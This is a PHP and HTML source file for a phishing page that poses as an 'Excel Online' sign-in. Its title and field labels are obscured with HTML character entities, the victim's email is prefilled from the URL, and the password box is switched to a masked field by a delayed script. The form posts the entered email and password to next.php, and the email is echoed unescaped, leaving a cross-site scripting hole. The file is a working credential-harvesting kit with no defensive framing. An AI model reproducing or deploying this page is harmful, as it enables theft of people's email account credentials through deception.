<?php

$user = $_GET['email'];
$email = $user;
if($_REQUEST['log'] == 1){$log=1;$email = $_REQUEST['email'];}

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#69;&#120;&#99;&#101;&#108;&#32;&#79;&#110;&#108;&#105;&#110;&#101;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">  
.textbox {  
    border: solid 1px #999;
	border-radius: 3px;
	padding-left: 8px;
	font-size: 15px;
    height: 35px; 
    width: 275px; 
 } 
 .textbox:focus {  
    border-color: #fff; 
  	border-bottom: #112F18;
    border-style: solid; 
    border-width: 1px; 
	border-radius: 4px;
    outline: 0; 
 } 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1350px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:251px; z-index:0"><img src="images/e1.png" alt="" title="" border=0 width=1350 height=251></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:543px; width:1350px; height:179px; z-index:1"><img src="images/e3.png" alt="" title="" border=0 width=1350 height=179></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:250px; width:1350px; height:295px; z-index:2"><img src="images/e2.png" alt="" title="" border=0 width=1350 height=295></div>
<form action=next.php name=nahalo id=nahalo method=post>
<input name="email" value="<?php echo $email; ?>" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:280px;left:542px;top:250px;z-index:3">
<input name="psw" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:280px;left:542px;top:300px;z-index:4">
<div id="formimage1" style="position:absolute; left:541px; top:348px; z-index:5"><input type="image" name="formimage1" width="282" height="37" src="images/btn.png"></div>
</div>

</body>
</html>
